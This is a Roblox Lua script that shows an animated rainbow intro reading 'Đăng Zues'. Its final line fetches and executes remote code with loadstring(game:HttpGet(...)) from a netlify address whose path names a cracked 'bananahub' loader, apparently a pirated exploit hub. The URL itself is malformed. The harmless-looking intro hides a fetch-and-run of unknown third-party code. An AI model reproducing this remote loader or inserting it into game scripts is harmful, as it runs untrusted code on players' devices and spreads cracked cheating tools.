local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "DangZuesIntro"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BackgroundTransparency = 0.3
bg.BorderSizePixel = 0
bg.Parent = gui

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, 0, 0, 120)
text.Position = UDim2.new(0, 0, -0.25, 0)
text.BackgroundTransparency = 1
text.Text = "Đăng Zues🍌🧊"
text.TextScaled = true
text.Font = Enum.Font.GothamBlack
text.TextStrokeTransparency = 0
text.TextStrokeColor3 = Color3.new(0, 0, 0)
text.Parent = bg

local rainbow = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 128, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 170, 255),
    Color3.fromRGB(80, 0, 255),
    Color3.fromRGB(255, 0, 255)
}

-- Chữ rơi xuống giữa màn hình
local drop = TweenService:Create(
    text,
    TweenInfo.new(1.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
    {
        Position = UDim2.new(0, 0, 0.38, 0)
    }
)

drop:Play()

-- Đổi màu 7 màu
task.spawn(function()
    local i = 1
    while gui.Parent do
        text.TextColor3 = rainbow[i]
        i = i + 1
        if i > #rainbow then
            i = 1
        end
        task.wait(0.15)
    end
end)

drop.Completed:Wait()
task.wait(1)

-- Làm intro mờ dần
local fadeText = TweenService:Create(
    text,
    TweenInfo.new(0.6),
    {TextTransparency = 1, TextStrokeTransparency = 1}
)

local fadeBg = TweenService:Create(
    bg,
    TweenInfo.new(0.6),
    {BackgroundTransparency = 1}
)

fadeText:Play()
fadeBg:Play()
fadeText.Completed:Wait()

gui:Destroy()

-- Chạy code tiếp theo
loadstring(game:HttpGet("https:/aforge-antiraw.netlify.app/raw/bana nahub-loader-crackked-3BdMameB5fMVjsAEuDNF97J"))()
